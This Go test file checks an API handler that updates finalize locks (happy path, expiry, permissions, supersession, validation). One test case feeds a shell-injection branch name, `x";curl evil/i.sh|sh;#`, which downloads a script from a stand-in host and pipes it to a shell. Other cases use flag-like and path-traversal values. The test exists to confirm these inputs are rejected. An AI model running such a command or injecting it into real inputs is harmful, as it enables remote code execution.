package finalize_test

import (
	"context"
	"testing"
	"time"

	"github.com/oklog/ulid/v2"

	"jamsesh/internal/api/openapi"
	"jamsesh/internal/db/store"
)

// seedCallerLock creates a fresh lock held by env.caller. Returns the lock id.
func seedCallerLock(t *testing.T, env *finalizeEnv) string {
	t.Helper()
	ctx := context.Background()
	id := ulid.Make().String()
	now := time.Now().UTC()
	if err := env.store.InsertFinalizeLock(ctx, store.InsertFinalizeLockParams{
		ID:                  id,
		OrgID:               env.orgID,
		SessionID:           env.sessID,
		AcquiredByAccountID: env.caller.ID,
		AcquiredAt:          now,
		LastActivityAt:      now,
		SelectedCommitSHAs:  "[]",
		Mode:                "squash",
	}); err != nil {
		t.Fatalf("seed lock: %v", err)
	}
	return id
}

// validBaseSHA is a well-formed 40-hex-char SHA used in happy-path tests.
const validBaseSHA = "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef"

func TestPatchFinalizeLock_HappyUpdate(t *testing.T) {
	env := newFinalizeEnv(t)
	lockID := seedCallerLock(t, env)

	cm := "Squash subject"
	resp, err := env.handler.PatchFinalizeLock(env.callerCtx, openapi.PatchFinalizeLockRequestObject{
		OrgID:     env.orgID,
		SessionID: env.sessID,
		LockID:    lockID,
		Body: &openapi.PatchFinalizeLockJSONRequestBody{
			SelectedCommitShas: []string{"abc", "def"},
			TargetBranch:       "main",
			BaseSha:            validBaseSHA,
			Mode:               openapi.PlanMode("squash"),
			CommitMessage:      cm,
		},
	})
	if err != nil {
		t.Fatalf("patch: %v", err)
	}
	r, ok := resp.(openapi.PatchFinalizeLock200JSONResponse)
	if !ok {
		t.Fatalf("expected 200, got %T", resp)
	}
	if r.BaseSha != validBaseSHA {
		t.Errorf("BaseSha = %q, want %s", r.BaseSha, validBaseSHA)
	}
	if r.TargetBranch != "main" {
		t.Errorf("TargetBranch = %q, want main", r.TargetBranch)
	}
	if len(r.SelectedCommitShas) != 2 || r.SelectedCommitShas[0] != "abc" || r.SelectedCommitShas[1] != "def" {
		t.Errorf("SelectedCommitShas = %v, want [abc def]", r.SelectedCommitShas)
	}
	if string(r.Mode) != "squash" {
		t.Errorf("Mode = %v, want squash", r.Mode)
	}
	if r.CommitMessage != "Squash subject" {
		t.Errorf("CommitMessage = %q, want %q", r.CommitMessage, "Squash subject")
	}

	// Activity bumped.
	row, _ := env.store.GetFinalizeLockByID(context.Background(), lockID)
	if !row.LastActivityAt.After(row.AcquiredAt) {
		t.Errorf("LastActivityAt %v not after AcquiredAt %v", row.LastActivityAt, row.AcquiredAt)
	}
}

func TestPatchFinalizeLock_IdleExpired_409AndReleases(t *testing.T) {
	env := newFinalizeEnv(t)
	ctx := context.Background()

	// Seed an idle (31-min-old) lock held by caller.
	id := ulid.Make().String()
	old := time.Now().UTC().Add(-31 * time.Minute)
	if err := env.store.InsertFinalizeLock(ctx, store.InsertFinalizeLockParams{
		ID:                  id,
		OrgID:               env.orgID,
		SessionID:           env.sessID,
		AcquiredByAccountID: env.caller.ID,
		AcquiredAt:          old,
		LastActivityAt:      old,
		SelectedCommitSHAs:  "[]",
		Mode:                "squash",
	}); err != nil {
		t.Fatalf("seed idle lock: %v", err)
	}

	resp, err := env.handler.PatchFinalizeLock(env.callerCtx, openapi.PatchFinalizeLockRequestObject{
		OrgID:     env.orgID,
		SessionID: env.sessID,
		LockID:    id,
		Body: &openapi.PatchFinalizeLockJSONRequestBody{
			SelectedCommitShas: []string{},
			TargetBranch:       "main",
			BaseSha:            validBaseSHA,
			Mode:               "squash",
		},
	})
	if err != nil {
		t.Fatalf("patch: %v", err)
	}
	r, ok := resp.(openapi.PatchFinalizeLock409JSONResponse)
	if !ok {
		t.Fatalf("expected 409, got %T", resp)
	}
	if r.Error != "finalize.lock_expired" {
		t.Errorf("error = %q, want finalize.lock_expired", r.Error)
	}

	// Released.
	row, _ := env.store.GetFinalizeLockByID(ctx, id)
	if row.ReleasedAt == nil {
		t.Error("expected released_at to be set on idle-expired lock")
	}
}

func TestPatchFinalizeLock_NonCaller_403(t *testing.T) {
	env := newFinalizeEnv(t)
	lockID := seedCallerLock(t, env)

	resp, err := env.handler.PatchFinalizeLock(env.otherCtx, openapi.PatchFinalizeLockRequestObject{
		OrgID:     env.orgID,
		SessionID: env.sessID,
		LockID:    lockID,
		Body: &openapi.PatchFinalizeLockJSONRequestBody{
			SelectedCommitShas: []string{},
			TargetBranch:       "main",
			BaseSha:            validBaseSHA,
			Mode:               "squash",
		},
	})
	if err != nil {
		t.Fatalf("patch: %v", err)
	}
	if _, ok := resp.(openapi.PatchFinalizeLock403JSONResponse); !ok {
		t.Fatalf("expected 403, got %T", resp)
	}
}

func TestPatchFinalizeLock_Superseded_409(t *testing.T) {
	env := newFinalizeEnv(t)
	ctx := context.Background()

	oldID := seedCallerLock(t, env)
	newID := ulid.Make().String()
	if err := env.store.InsertFinalizeLock(ctx, store.InsertFinalizeLockParams{
		ID:                  newID,
		OrgID:               env.orgID,
		SessionID:           env.sessID,
		AcquiredByAccountID: env.otherID,
		AcquiredAt:          time.Now().UTC(),
		LastActivityAt:      time.Now().UTC(),
		SelectedCommitSHAs:  "[]",
		Mode:                "squash",
	}); err != nil {
		t.Fatalf("seed new lock: %v", err)
	}
	if err := env.store.SupersedeFinalizeLock(ctx, store.SupersedeFinalizeLockParams{
		ID:                 oldID,
		SupersededByLockID: newID,
	}); err != nil {
		t.Fatalf("supersede: %v", err)
	}

	resp, err := env.handler.PatchFinalizeLock(env.callerCtx, openapi.PatchFinalizeLockRequestObject{
		OrgID:     env.orgID,
		SessionID: env.sessID,
		LockID:    oldID,
		Body: &openapi.PatchFinalizeLockJSONRequestBody{
			SelectedCommitShas: []string{},
			TargetBranch:       "main",
			BaseSha:            validBaseSHA,
			Mode:               "squash",
		},
	})
	if err != nil {
		t.Fatalf("patch: %v", err)
	}
	r, ok := resp.(openapi.PatchFinalizeLock409JSONResponse)
	if !ok {
		t.Fatalf("expected 409, got %T", resp)
	}
	if r.Error != "finalize.lock_superseded" {
		t.Errorf("error = %q, want finalize.lock_superseded", r.Error)
	}
	if r.Details == nil || r.Details["superseded_by_lock_id"] != newID {
		t.Errorf("details.superseded_by_lock_id = %v, want %s", r.Details, newID)
	}
}

func TestPatchFinalizeLock_NotFound_404(t *testing.T) {
	env := newFinalizeEnv(t)

	resp, err := env.handler.PatchFinalizeLock(env.callerCtx, openapi.PatchFinalizeLockRequestObject{
		OrgID:     env.orgID,
		SessionID: env.sessID,
		LockID:    ulid.Make().String(),
		Body: &openapi.PatchFinalizeLockJSONRequestBody{
			SelectedCommitShas: []string{},
			TargetBranch:       "main",
			BaseSha:            validBaseSHA,
			Mode:               "squash",
		},
	})
	if err != nil {
		t.Fatalf("patch: %v", err)
	}
	if _, ok := resp.(openapi.PatchFinalizeLock404JSONResponse); !ok {
		t.Fatalf("expected 404, got %T", resp)
	}
}

func TestPatchFinalizeLock_InvalidMode_400(t *testing.T) {
	env := newFinalizeEnv(t)
	lockID := seedCallerLock(t, env)

	resp, err := env.handler.PatchFinalizeLock(env.callerCtx, openapi.PatchFinalizeLockRequestObject{
		OrgID:     env.orgID,
		SessionID: env.sessID,
		LockID:    lockID,
		Body: &openapi.PatchFinalizeLockJSONRequestBody{
			SelectedCommitShas: []string{},
			TargetBranch:       "main",
			BaseSha:            validBaseSHA,
			Mode:               "bogus",
		},
	})
	if err != nil {
		t.Fatalf("patch: %v", err)
	}
	if _, ok := resp.(openapi.PatchFinalizeLock400JSONResponse); !ok {
		t.Fatalf("expected 400, got %T", resp)
	}
}

func TestPatchFinalizeLock_RejectsMaliciousTargetBranch(t *testing.T) {
	cases := []struct {
		name   string
		branch string
	}{
		{"shell_injection", `x";curl evil/i.sh|sh;#`},
		{"flag_like", "-rf"},
		{"space", "foo bar"},
		{"newline", "foo\nbar"},
		{"dotdot_escape", "../escape"},
		{"dotdot_middle", "main/../evil"},
		{"empty", ""},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			env := newFinalizeEnv(t)
			lockID := seedCallerLock(t, env)

			// Read the lock before the request so we can verify no mutation.
			before, err := env.store.GetFinalizeLockByID(context.Background(), lockID)
			if err != nil {
				t.Fatalf("pre-read lock: %v", err)
			}

			resp, err := env.handler.PatchFinalizeLock(env.callerCtx, openapi.PatchFinalizeLockRequestObject{
				OrgID:     env.orgID,
				SessionID: env.sessID,
				LockID:    lockID,
				Body: &openapi.PatchFinalizeLockJSONRequestBody{
					SelectedCommitShas: []string{},
					TargetBranch:       tc.branch,
					BaseSha:            validBaseSHA,
					Mode:               "squash",
				},
			})
			if err != nil {
				t.Fatalf("patch: %v", err)
			}

			r, ok := resp.(openapi.PatchFinalizeLock400JSONResponse)
			if !ok {
				t.Fatalf("expected 400, got %T", resp)
			}
			if r.Error != "session.invalid_target_branch" {
				t.Errorf("error = %q, want session.invalid_target_branch", r.Error)
			}

			// No DB mutation: target_branch must still be the seeded value.
			after, err := env.store.GetFinalizeLockByID(context.Background(), lockID)
			if err != nil {
				t.Fatalf("post-read lock: %v", err)
			}
			if after.TargetBranch != before.TargetBranch {
				t.Errorf("TargetBranch mutated: before=%q after=%q", before.TargetBranch, after.TargetBranch)
			}
			if after.LastActivityAt != before.LastActivityAt {
				t.Errorf("LastActivityAt changed despite rejected request")
			}
		})
	}
}

func TestPatchFinalizeLock_RejectsMalformedBaseSHA(t *testing.T) {
	cases := []struct {
		name string
		sha  string
	}{
		{"too_short", "abc"},
		{"non_hex_chars", "xyz1234567890abcdef1234567890abcdef123456"},
		{"uppercase_hex", "DEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF"},
		{"empty", ""},
		{"39_chars", "deadbeefdeadbeefdeadbeefdeadbeefdeadbee"},
		{"41_chars", "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef0"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			env := newFinalizeEnv(t)
			lockID := seedCallerLock(t, env)

			resp, err := env.handler.PatchFinalizeLock(env.callerCtx, openapi.PatchFinalizeLockRequestObject{
				OrgID:     env.orgID,
				SessionID: env.sessID,
				LockID:    lockID,
				Body: &openapi.PatchFinalizeLockJSONRequestBody{
					SelectedCommitShas: []string{},
					TargetBranch:       "main",
					BaseSha:            tc.sha,
					Mode:               "squash",
				},
			})
			if err != nil {
				t.Fatalf("patch: %v", err)
			}

			r, ok := resp.(openapi.PatchFinalizeLock400JSONResponse)
			if !ok {
				t.Fatalf("expected 400, got %T", resp)
			}
			if r.Error != "session.invalid_base_sha" {
				t.Errorf("error = %q, want session.invalid_base_sha", r.Error)
			}
		})
	}
}
